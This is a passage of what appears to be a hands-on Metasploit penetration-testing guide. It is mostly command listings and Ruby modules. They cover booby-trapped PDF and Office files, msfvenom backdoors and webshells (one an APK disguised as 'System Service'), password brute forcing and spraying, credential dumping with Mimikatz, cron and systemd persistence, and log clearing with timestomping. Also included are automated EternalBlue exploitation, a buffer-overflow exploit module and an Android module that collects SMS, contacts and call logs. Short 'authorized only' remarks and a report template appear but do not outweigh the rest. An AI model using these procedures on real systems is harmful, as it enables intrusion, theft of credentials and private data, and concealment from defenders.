set LHOST 192.168.1.10
exploit
```

---

## 17. Client-Side Attacks

### 17.1 File Format Exploits

```bash
# ==========================================
#       PDF EXPLOITS
# ==========================================

use exploit/windows/fileformat/adobe_pdf_embedded_exe
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set FILENAME report.pdf
set INFILENAME /path/to/legitimate.pdf
exploit

# ==========================================
#       OFFICE EXPLOITS
# ==========================================

# Word document
use exploit/windows/fileformat/ms17_11882
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set FILENAME invoice.docx
exploit

# Excel
use exploit/windows/fileformat/ms_excel_dde
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set FILENAME budget.xlsx
exploit

# ==========================================
#       IMAGE EXPLOITS
# ==========================================

# JPEG exploit (older)
use exploit/windows/fileformat/ms12_005
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```

### 17.2 Listener Setup for Client-Side

```bash
# After generating malicious files, set up handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j

# For HTTP-based payloads
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 443
set HandlerSSLCert /path/to/cert.pem
set ExitOnSession false
exploit -j
```

---

## 18. Wireless Attacks

### 18.1 WiFi Attacks

```bash
# ==========================================
#       WIRELESS AUXILIARY MODULES
# ==========================================

# WiFi scanner
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 192.168.1.0/24
run

# WiFi AP discovery
use auxiliary/scanner/netbios/nbname
set RHOSTS 192.168.1.0/24
run

# ==========================================
#       ROGUE AP ATTACK
# ==========================================

# Using airbase-ng with Metasploit
# 1. Create rogue AP
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# 2. Set up Metasploit to serve exploits
use exploit/multi/browser/java_signed_applet
set SRVHOST 192.168.1.10
set SRVPORT 80
set URIPATH /
exploit

# 3. Redirect traffic to your exploit
# Configure iptables to redirect HTTP to your exploit server
```

---

## 19. Password Attacks

### 19.1 Brute Force Attacks

```bash
# ==========================================
#       SSH BRUTE FORCE
# ==========================================

use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.20
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
set VERBOSE true
run

# SSH key-based
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.1.20
set USERNAME root
set KEY_PATH /path/to/id_rsa
run

# ==========================================
#       FTP BRUTE FORCE
# ==========================================

use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.20
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# ==========================================
#       SMB BRUTE FORCE
# ==========================================

use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.20
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
run

# ==========================================
#       HTTP FORM BRUTE FORCE
# ==========================================

use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.20
set AUTH_URI /login
set USERPASS_FILE /usr/share/wordlists/metasprixoot/http_default_userpass.txt
run

# ==========================================
#       MYSQL BRUTE FORCE
# ==========================================

use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.20
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# ==========================================
#       RDP BRUTE FORCE
# ==========================================

use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.20
run

# ==========================================
#       VNC BRUTE FORCE
# ==========================================

use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.1.20
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# ==========================================
#       PASSWORD SPRAYING
# ==========================================

# Use a small password list against many users
use auxiliary/scanner/smb/smb_login
set RHOSTS file:/tmp/targets.txt
set USER_FILE /tmp/users.txt
set PASS_FILE /tmp/passwords.txt
set THREADS 1
set STOP_ON_SUCCESS false
run
```

### 19.2 Credential Dumping

```bash
# ==========================================
#       POST-EXPLOITATION CREDENTIAL DUMPING
# ==========================================

# Windows SAM dump (via Meterpreter)
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00:::

# Using Mimikatz
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > creds_msv
meterpreter > creds_kerberos

# SAM database
meterpreter > lsa_dump_sam

# LSA secrets
metermeter > lsa_dump_secrets

# Cached domain credentials
meterpreter > cachedump

# ==========================================
#       LINUX CREDENTIAL DUMPING
# ==========================================

# Shadow file
meterpreter > cat /etc/shadow

# Hashdump post module
use post/linux/gather/hashdump
set SESSION 1
run

# SSH keys
use post/multi/gather/ssh_creds
set SESSION 1
run

# Browser credentials
use post/multi/gather/firefox_creds
set SESSION 1
run

# ==========================================
#       ANDROID CREDENTIAL DUMPING
# ==========================================

# Using post modules
use post/android/gather/hashdump
set SESSION 1
run

# Dump app databases
meterpreter > shell
cd /data/data/com.target.app/databases/
download database.db
```

---

## 20. Maintaining Access

### 20.1 Persistence Mechanisms

```bash
# ==========================================
#       WINDOWS PERSISTENCE
# ==========================================

# Method 1: Registry persistence
use exploit/windows/local/persistence
set SESSION 1
set LHOST 192.168.1.10
set LPORT 4444
set STARTUP SYSTEM
exploit

# Method 2: Scheduled task persistence
use exploit/windows/local/persistence_service
set SESSION 1
set LHOST 192.168.1.10
set LPORT 4444
exploit

# Method 3: Meterpreter service
meterpreter > run metsvc -A

# Method 4: DLL hijacking
use exploit/windows/local/persistence_image_hijack
set SESSION 1
set LHOST 192.168.1.10
exploit

# Method 5: Startup folder
use exploit/windows/local/persistence_startup
set SESSION 1
set LHOST 192.168.1.10
set LPORT 4444
exploit

# ==========================================
#       LINUX PERSISTENCE
# ==========================================

# Method 1: Cron job
meterpreter > shell
echo "* * * * * /tmp/backdoor" >> /var/spool/cron/crontabs/root

# Method 2: RC script
meterpreter > shell
echo "/tmp/backdoor &" >> /etc/rc.local

# Method 3: Systemd service
meterpreter > shell
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service
[Service]
ExecStart=/tmp/backdoor
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service

# ==========================================
#       ANDROID PERSISTENCE
# ==========================================

# Method 1: Boot receiver
# The injected APK already has RECEIVE_BOOT_COMPLETED permission
# The payload will start on device boot

# Method 2: Background service
# Meterpreter on Android runs as a background service
# It persists until the app is uninstalled or force-stopped

# Method 3: Device admin (requires user to activate)
# Can be added to the payload for enhanced persistence
```

### 20.2 Backdoor Types

```bash
# ==========================================
#       GENERATING BACKDOORS
# ==========================================

# Standalone backdoor executable
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -e x64/xor_dynamic \
    -i 5 \
    -f exe \
    -o backdoor.exe

# Backdoor DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f dll \
    -o backdoor.dll

# PowerShell backdoor (fileless)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f psh \
    -o backdoor.ps1

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f raw \
    -o shell.php

# Python backdoor
msfvenom -p python/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f raw \
    -o backdoor.py

# Android APK backdoor
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "System Service" \
    -f apk \
    -o backdoor.apk

# JSP webshell
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f raw \
    -o shell.jsp

# WAR file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f war \
    -o shell.war
```

---

## 21. Covering Tracks

### 21.1 Log Clearing

```bash
# ==========================================
#       WINDOWS LOG CLEARING
# ==========================================

# Clear event logs
meterpreter > shell
wevtutil cl Application
wevtutil cl System
wevtutil cl Security

# Using Meterpreter
use post/windows/manage/clear_eventlog
set SESSION 1
run

# ==========================================
#       LINUX LOG CLEARING
# ==========================================

meterpreter > shell
# Clear common logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/messages
echo "" > /var/log/kern.log
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# Remove bash history
rm -f /root/.bash_history
rm -f /home/*/.bash_history
history -c

# ==========================================
#       ANDROID LOG CLEARING
# ==========================================

# Clear logcat
meterpreter > shell
logcat -c

# Clear application data
# Be careful - this removes app-specific data
```

### 21.2 Anti-Forensics

```bash
# ==========================================
#       Timestomp (Windows)
# ==========================================

meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -e "01/01/2020 00:00:00"

# ==========================================
#       File deletion
# ==========================================

# Secure delete (overwrite before deletion)
meterpreter > shell
cipher /w:C:\\  # Wipe free space on Windows

# Linux secure delete
meterpreter > shell
shred -vfz -n 5 /tmp/backdoor
```

---

## 22. Database Integration

### 22.1 Using the Database

```bash
# ==========================================
#       DATABASE COMMANDS
# ==========================================

# Check connection
db_status

# Connect to database
db_connect msf:password@localhost/msf_database

# Workspaces
workspace              # List workspaces
workspace -a pentest1  # Create workspace
workspace -d pentest1  # Delete workspace
workspace pentest1     # Switch workspace

# ==========================================
#       STORING AND QUERYING DATA
# ==========================================

# Hosts
hosts                  # List hosts
hosts -c address,name  # Specific columns
hosts -S <search>      # Search hosts

# Services
services               # List services
services -p 80         # Filter by port
services -s http       # Filter by service name

# Vulnerabilities
vulns                  # List vulnerabilities
vulns -S <search>      # Search vulnerabilities

# Credentials
creds                  # List credentials
creds -S <search>      # Search credentials

# Loot
loot                   # List loot

# Notes
notes                  # List notes

# ==========================================
#       IMPORTING/EXPORTING
# ==========================================

# Import Nmap results
db_import /tmp/nmap_scan.xml

# Import Nessus results
db_import /tmp/nessus_scan.nessus

# Import OpenVAS results
db_import /tmp/openvas_report.xml

# Export data
db_export -f xml /tmp/export.xml
db_export -f pwdump /tmp/export.pwdump

# ==========================================
#       REPORTING (with database)
# ==========================================

# Generate report (requires Metasploit Pro)
# Or use manual methods
hosts -o /tmp/hosts.csv
services -o /tmp/services.csv
vulns -o /tmp/vulns.csv
creds -o /tmp/creds.csv
```

---

## 23. Metasploit Pro

### 23.1 Metasploit Pro Features

```
METASPLOIT PRO ADDITIONAL FEATURES:
├── Web Interface
│   ├── GUI-based project management
│   ├── Team collaboration
│   └── Visual attack planning
│
├── Automated Exploitation
│   ├── Smart exploitation
│   ├── Automated payload selection
│   └── Quick pentest wizard
│
├── Credential Management
│   ├── Credential storage
│   ├── Password auditing
│   └── Credential reuse testing
│
├── Social Engineering
│   ├── Phishing campaigns
│   ├── Email templates
│   └── Campaign tracking
│
├── Web Application Testing
│   ├── Web app scanner
│   ├── Crawler
│   └── Fuzzer
│
├── Reporting
│   ├── Executive reports
│   ├── Technical reports
│   ├── Compliance reports
│   └── Custom report templates
│
├── VPN Pivoting
│   ├── Transparent pivoting
│   ├── No client configuration needed
│   └── Full network access
│
├── Policy Management
│   ├── Compliance policies
│   ├── Scan policies
│   └── Custom rules
│
└── API
    ├── REST API
    ├── Integration capabilities
    └── Automation support
```

### 23.2 Metasploit Pro Web Interface

```
Access Metasploit Pro Web UI:
1. Start Metasploit Pro service
2. Navigate to https://localhost:3790
3. Login with credentials

Common Tasks:
├── Create Project
│   ├── Name and description
│   ├── Scope definition
│   └── Network ranges
│
├── Run Scan
│   ├── Discovery scan
│   ├── Exploitation scan
│   └── Web app scan
│
├── Generate Report
│   ├── Executive summary
│   ├── Technical details
│   ├── Remediation guide
│   └── Export formats (PDF, HTML, XML)
│
└── Team Collaboration
    ├── Shared projects
    ├── Notes and evidence
    └── Role-based access
```

---

## 24. Automation with Resource Scripts

### 24.1 Resource Script Basics

```bash
# ==========================================
#       RESOURCE SCRIPT SYNTAX
# ==========================================

# Basic resource script (autoexploit.rc)
# Lines starting with # are comments

# Set global variables
setg LHOST 192.168.1.10
setg LPORT 4444

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run the exploit
exploit -j -z

# Wait for session
sleep 30

# Interact with session
sessions -i 1 -c "getuid"
sessions -i 1 -c "sysinfo"
sessions -i 1 -c "hashdump"

# ==========================================
#       EXECUTING RESOURCE SCRIPTS
# ==========================================

# Method 1: From msfconsole
msf6 > resource autoexploit.rc

# Method 2: From command line
msfconsole -r autoexploit.rc

# Method 3: Save commands and execute later
msf6 > makerc my_commands.rc

# ==========================================
#       CONDITIONAL LOGIC (Limited)
# ==========================================

# Resource scripts support limited conditionals
# Use Ruby scripts for complex logic

# Check if session exists
sessions -l

# ==========================================
#       LOOPS IN RESOURCE SCRIPTS
# ==========================================

# Scan multiple hosts
# hosts_file.rc
<ruby>
File.open('/tmp/targets.txt').each_line do |host|
  run_single("use auxiliary/scanner/portscan/tcp")
  run_single("set RHOSTS #{host.strip()}")
  run_single("run")
end
</ruby>
```

### 24.2 Advanced Resource Scripts

```bash
# ==========================================
#       AUTOMATED SCANNING SCRIPT
# ==========================================

cat > auto_scan.rc << 'EOF'
# Automated Network Scanner
# Author: EFXTv

setg LHOST 192.168.1.10
setg LPORT 4444

# Nmap scan
db_nmap -sV -sC -O -A 192.168.1.0/24 -oA network_scan

# SMB Scan
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 20
run

# HTTP Scan
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
set RPORT 80
run

# SSH Scan
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# FTP Scan
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run

# Generate report
hosts
services
vulns

echo [*] Scan complete. Check database for results.
EOF

msfconsole -r auto_scan.rc

# ==========================================
#       AUTOMATED EXPLOITATION SCRIPT
# ==========================================

cat > auto_exploit.rc << 'EOF'
# Automated MS17-010 Exploitation
# Author: EFXTv
# Only use on authorized targets!

setg LHOST 192.168.1.10
setg LPORT 4444

# Check for MS17-010
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# Exploit vulnerable hosts
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.1.0/24
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Wait for sessions
sleep 60

# Enumerate sessions
sessions -l

# Post-exploitation on all sessions
<ruby>
framework.sessions.each_pair do |sid, session|
  if session.type == 'meterpreter' && session.platform == 'windows'
    run_single("sessions -i #{sid}")
    run_single("run post/windows/gather/enum_applications")
    run_single("run post/windows/gather/smart_hashdump")
    run_single("background")
  end
end
</ruby>
EOF

# ==========================================
#       ANDROID PAYLOAD LISTENER SCRIPT
# ==========================================

cat > android_listener.rc << 'EOF'
# Android Meterpreter Listener
# Author: EFXTv

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/android/gather/enum_applications
exploit -j -z

echo [*] Android listener started on 192.168.1.10:4444
echo [*] Waiting for connections...
EOF

# ==========================================
#       MULTI-PAYLOAD LISTENER SCRIPT
# ==========================================

cat > multi_handler.rc << 'EOF'
# Multi-Payload Handler
# Author: EFXTv

# Windows x64 Meterpreter
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Windows x86 Meterpreter
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4445
set ExitOnSession false
exploit -j -z

# Android Meterpreter
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4446
set ExitOnSession false
exploit -j -z

# Linux Meterpreter
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4447
set ExitOnSession false
exploit -j -z

echo [*] Multi-payload listeners started
echo [*] Windows x64: 4444, Windows x86: 4445
echo [*] Android: 4446, Linux: 4447
EOF

# ==========================================
#       RUBY SCRIPTING IN RESOURCE SCRIPTS
# ==========================================

cat > ruby_automation.rc << 'EOF'
# Advanced Ruby Automation
<ruby>
# Read target list
targets = []
File.open('/tmp/targets.txt').each_line do |line|
  targets << line.strip
end

# Scan each target
targets.each do |target|
  print_status("Scanning #{target}")
  
  run_single("use auxiliary/scanner/portscan/tcp")
  run_single("set RHOSTS #{target}")
  run_single("set PORTS 21,22,80,443,445,3389,8080")
  run_single("run")
  run_single("back")
end

# Check for vulnerable targets
print_status("Checking for MS17-010...")
targets.each do |target|
  run_single("use auxiliary/scanner/smb/smb_ms17_010")
  run_single("set RHOSTS #{target}")
  run_single("run")
  run_single("back")
end

print_status("Automation complete!")
end
</ruby>
EOF
```

---

## 25. Custom Module Development

### 25.1 Module Development Environment

```bash
# ==========================================
#       SETTING UP DEVELOPMENT ENVIRONMENT
# ==========================================

# Metasploit module location
ls /opt/metasploit-framework/modules/

# Custom modules directory (user-specific)
mkdir -p ~/.msf4/modules/exploits/custom/
mkdir -p ~/.msf4/modules/auxiliary/custom/
mkdir -p ~/.msf4/modules/post/custom/

# Reload modules after changes
msf6 > reload_all
# OR
msf6 > db_rebuild_cache
```

### 25.2 Writing a Custom Exploit Module

```ruby
# ~/.msf4/modules/exploits/custom/my_exploit.rb
# Custom Exploit Module Template
# Author: EFXTv

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Application Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow vulnerability in
        CustomApp version 1.0. The vulnerability exists in the
        handling of the 'USER' command.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'EFXTv',      # Discovery and exploit development
      ],
      'References'     => [
        ['CVE', '2024-12345'],
        ['URL', 'https://example.com/advisory']
      ],
      'Payload'        => {
        'Space'    => 400,
        'BadChars' => "\x00\x0a\x0d\x20",
        'DisableNops' => true
      },
      'Platform'       => 'win',
      'Targets'        => [
        [ 'CustomApp v1.0 on Windows 10 x64',
          {
            'Ret'    => 0x10015ffe,  # JMP ESP
            'Offset' => 2606
          }
        ],
        [ 'CustomApp v1.0 on Windows 7 x86',
          {
            'Ret'    => 0x10016002,
            'Offset' => 2606
          }
        ],
      ],
      'Privileged'     => false,
      'DisclosureDate' => 'Jan 15 2024',
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(9999),
      OptString.new('USERNAME', [false, 'Username for authentication']),
    ])

    register_advanced_options([
      OptBool.new('DEBUG', [false, 'Enable debug output', false])
    ])
  end

  def check
    connect
    sock.put("VERSION\r\n")
    res = sock.get_once(10)
    disconnect

    if res.nil?
      return Exploit::CheckCode::Unknown
    end

    if res =~ /CustomApp v(\d+\.\d+)/
      version = $1
      if version == '1.0'
        return Exploit::CheckCode::Appears
      else
        return Exploit::CheckCode::Detected
      end
    end

    Exploit::CheckCode::Safe
  rescue Rex::ConnectionError
    Exploit::CheckCode::Unknown
  end

  def exploit
    print_status("Connecting to #{rhost}:#{rport}...")
    connect

    # Build buffer
    buf = rand_text_alpha(target['Offset'])
    buf << generate_seh_record(target.ret)
    buf << make_nops(32)
    buf << payload.encoded

    # Send exploit
    print_status("Sending exploit buffer (#{buf.length} bytes)...")
    sock.put("USER #{buf}\r\n")
    sock.put("PASS test\r\n")

    print_status("Waiting for payload execution...")
    handler
    disconnect
  end
end
```

### 25.3 Writing a Custom Auxiliary Module

```ruby
# ~/.msf4/modules/auxiliary/custom/scanner/custom_app_scanner.rb
# Custom Scanner Module
# Author: EFXTv

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'CustomApp Version Scanner',
      'Description' => 'Scans for and fingerprints CustomApp services',
      'Author'      => ['EFXTv'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(9999),
      OptInt.new('TIMEOUT', [true, 'Connection timeout', 10]),
      OptBool.new('VERBOSE', [true, 'Verbose output', true])
    ])
  end

  def run_host(ip)
    begin
      connect
      
      # Send version query
      sock.put("VERSION\r\n")
      res = sock.get_once(datastore['TIMEOUT'])

      if res.nil?
        vprint_status("#{ip}:#{rport} - No response")
        return
      end

      if res =~ /CustomApp v(\d+\.\d+(\.\d+)?)/
        version = $1
        print_good("#{ip}:#{rport} - CustomApp v#{version} detected")
        
        # Store service information
        report_service(
          host: ip,
          port: rport,
          proto: 'tcp',
          name: 'customapp',
          info: "CustomApp v#{version}"
        )

        # Check for known vulnerable version
        if version =~ /^1\.0/
          print_warning("#{ip}:#{rport} - Version 1.0 is known vulnerable!")
          
          report_vuln(
            host: ip,
            port: rport,
            name: 'CustomApp Buffer Overflow',
            refs: references,
            info: "CustomApp v#{version} is vulnerable to buffer overflow"
          )
        end
      else
        vprint_status("#{ip}:#{rport} - Not CustomApp (response: #{res.strip})")
      end

    rescue Rex::ConnectionError => e
      vprint_error("#{ip}:#{rport} - Connection failed: #{e.message}")
    rescue ::Exception => e
      print_error("#{ip}:#{rport} - Error: #{e.message}")
    ensure
      disconnect
    end
  end
end
```

### 25.4 Writing a Custom Post Module

```ruby
# ~/.msf4/modules/post/custom/gather/android_data_collector.rb
# Custom Android Post-Exploitation Module
# Author: EFXTv

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Android::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Android Data Collector',
      'Description'   => %q{
        Collects sensitive data from Android devices including
        SMS messages, contacts, call logs, and installed applications.
        For authorized penetration testing only.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['EFXTv'],
      'Platform'      => ['android'],
      'SessionTypes'  => ['meterpreter']
    ))

    register_options([
      OptBool.new('SMS', [true, 'Collect SMS messages', true]),
      OptBool.new('CONTACTS', [true, 'Collect contacts', true]),
      OptBool.new('CALLS', [true, 'Collect call logs', true]),
      OptBool.new('APPS', [true, 'List installed apps', true]),
      OptBool.new('WIFI', [true, 'Collect WiFi data', true])
    ])
  end

  def run
    print_status("Android Data Collector - Starting...")
    print_status("Target: #{client.sysinfo['Computer']}")
    print_status("OS: #{client.sysinfo['OS']}")
    
    # Collect SMS
    if datastore['SMS']
      collect_sms
    end
    
    # Collect Contacts
    if datastore['CONTACTS']
      collect_contacts
    end
    
    # Collect Call Logs
    if datastore['CALLS']
      collect_calls
    end
    
    # List Apps
    if datastore['APPS']
      list_apps
    end
    
    # WiFi Info
    if datastore['WIFI']
      collect_wifi
    end
    
    print_status("Data collection complete!")
  end

  def collect_sms
    print_status("Collecting SMS messages...")
    
    sms_db = "/data/data/com.android.providers.telephony/databases/mmssms.db"
    
    if file_exist?(sms_db)
      data = read_file(sms_db)
      path = store_loot(
        "android.sms",
        "application/x-sqlite3",
        session,
        data,
        "mmssms.db",
        "Android SMS Database"
      )
      print_good("SMS database saved: #{path}")
    else
      print_error("SMS database not accessible (may need root)")
    end
  end

  def collect_contacts
    print_status("Collecting contacts...")
    
    contacts_db = "/data/data/com.android.providers.contacts/databases/contacts2.db"
    
    if file_exist?(contacts_db)
      data = read_file(contacts_db)
      path = store_loot(
        "android.contacts",
        "application/x-sqlite3",
        session,
        data,
        "contacts2.db",
        "Android Contacts Database"
      )
      print_good("Contacts database saved: #{path}")
    else
      print_error("Contacts database not accessible")
    end
  end

  def collect_calls
    print_status("Collecting call logs...")
    
    calls_db = "/data/data/com.android.providers.contacts/databases/contacts2.db"
    
    # Use content provider if direct access fails
    begin
      result = session.android.dump_calls
      if result && !result.empty?
        path = store_loot(
          "android.calls",
          "text/plain",
          session,
          result,
          "call_log.txt",
          "Android Call Log"
        )
        print_good("Call log saved: #{path}")
      end
    rescue => e
      print_error("Failed to collect call logs: #{e.message}")
    end
  end

  def list_apps
    print_status("Enumerating installed applications...")
    
    begin
      apps = session.android.enum_applications
      if apps && !apps.empty?
        app_list = apps.map { |a| "#{a['name']} (#{a['package']})" }.join("\n")
        
        path = store_loot(
          "android.apps",
          "text/plain",
          session,
          app_list,
          "installed_apps.txt",
          "Installed Android Applications"
        )
        print_good("#{apps.length} apps found. List saved: #{path}")
      end
    rescue => e
      print_error("Failed to enumerate apps: #{e.message}")
    end
  end

  def collect_wifi
    print_status("Collecting WiFi information...")
    
    begin
      wifi_data = session.android.wifi_list
      if wifi_data
        path = store_loot(
          "android.wifi",
          "text/plain",
          session,
          wifi_data,
          "wifi_info.txt",
          "Android WiFi Information"
        )
        print_good("WiFi info saved: #{path}")
      end
    rescue => e
      print_error("Failed to collect WiFi info: #{e.message}")
    end
  end
end
```

---

## 26. Reporting

### 26.1 Evidence Collection

```bash
# ==========================================
#       COLLECTING EVIDENCE
# ==========================================

# Screenshots
meterpreter > screenshot evidence_screenshot.png

# System info
meterpreter > sysinfo > sysinfo.txt

# Network info
meterpreter > ifconfig > network_info.txt
meterpreter > netstat > connections.txt
meterpreter > route > routing.txt

# Process list
meterpreter > ps > processes.txt

# User info
meterpreter > getuid > user_info.txt

# File system
meterpreter > ls -la > directory_listing.txt

# Store everything as loot
meterpreter > run scraper  # Collects comprehensive system info

# ==========================================
#       USING METASPLOIT'S STORE_LOOT
# ==========================================

# From post modules
store_loot(
  "evidence.type",      # Loot type
  "text/plain",         # MIME type
  session,              # Session object
  data,                 # Data to store
  "filename.txt",       # Filename
  "Description"         # Description
)

# Query stored loot
msf6 > loot
```

### 26.2 Report Generation

```bash
# ==========================================
#       METASPLOIT PRO REPORTING
# ==========================================

# Metasploit Pro includes built-in reporting
# Access via Web UI: Reports → Generate Report

# Report types:
# - Executive Report (high-level summary)
# - Technical Report (detailed findings)
# - PCI Report (PCI DSS compliance)
# - Custom Report (template-based)

# ==========================================
#       MANUAL REPORTING (Framework)
# ==========================================

# Export data for manual report generation
hosts -o /tmp/report_hosts.csv
services -o /tmp/report_services.csv
vulns -o /tmp/report_vulns.csv
creds -o /tmp/report_creds.csv
loot -o /tmp/report_loot.csv
notes -o /tmp/report_notes.csv

# Export full database
db_export -f xml /tmp/full_report.xml

# ==========================================
#       REPORT TEMPLATE
# ==========================================

cat > /tmp/pentest_report_template.md << 'TEMPLATE'
# Penetration Testing Report

## 1. Executive Summary
- **Client:** [Client Name]
- **Date:** [Testing Date]
- **Tester:** EFXTv
- **Scope:** [Network/App/System]
- **Overall Risk:** [Critical/High/Medium/Low]

### Key Findings
| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | [Finding] | Critical | Open |
| 2 | [Finding] | High | Open |
| 3 | [Finding] | Medium | Open |

## 2. Scope & Methodology
### Scope
- [IP ranges, domains, applications tested]

### Methodology
- OWASP Testing Guide v4
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115

### Tools Used
- Metasploit Framework v[version]
- Nmap v[version]
- Burp Suite v[version]
- [Other tools]

## 3. Technical Findings

### 3.1 [Critical Finding Title]
- **Risk Level:** Critical
- **CVSS Score:** [Score]
- **CWE:** [CWE-ID]
- **Description:** [Detailed description]
- **Impact:** [Business impact]
- **Evidence:** [Screenshots, logs]
- **Remediation:** [How to fix]

### 3.2 [High Finding Title]
...

## 4. Network Diagrams
[Include network diagrams]

## 5. Recommendations Summary
### Immediate Actions (0-30 days)
1. [Critical fixes]

### Short-term (30-90 days)
2. [High priority fixes]

### Long-term (90+ days)
3. [Medium priority fixes]

## 6. Appendices
### A. Full Port Scan Results
### B. Vulnerability Details
### C. Exploitation Evidence
### D. Credentials Found
### E. Tools and Versions

---
*Report generated by EFXTv*
*Date: [Current Date]*
TEMPLATE
```

---

## 27. Real-World Ethical Scenarios

### 27.1 Scenario 1: External Network Penetration Test

```bash
# ==========================================
#       SCENARIO: External Pentest
# ==========================================

# Given: External IP range, no credentials
# Goal: Assess external attack surface

# Phase 1: Reconnaissance
db_nmap -sV -sC -Pn -T4 203.0.113.0/24 -oA external_scan
db_nmap -p- -sV 203.0.113.0/24 -oA full_port_scan

# Phase 2: Vulnerability Assessment
# Identify exposed services
services -S "http,https" -R
services -S "ssh,rdp,smb" -R

# Phase 3: Exploitation
# Example: Exploit exposed web server
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 203.0.113.10
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 203.0.113.1
exploit

# Phase 4: Post-Exploitation
# Enumerate internal network from compromised host
meterpreter > run autoroute -s 10.0.0.0/8

# Pivot to internal networks
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
run

# Phase 5: Report
# Document all findings
```

### 27.2 Scenario 2: Android Application Security Assessment

```bash
# ==========================================
#       SCENARIO: Mobile App Pentest
# ==========================================

# Given: Android APK for testing
# Goal: Assess mobile application security

# Phase 1: Static Analysis
apktool d target.apk -o decompiled/
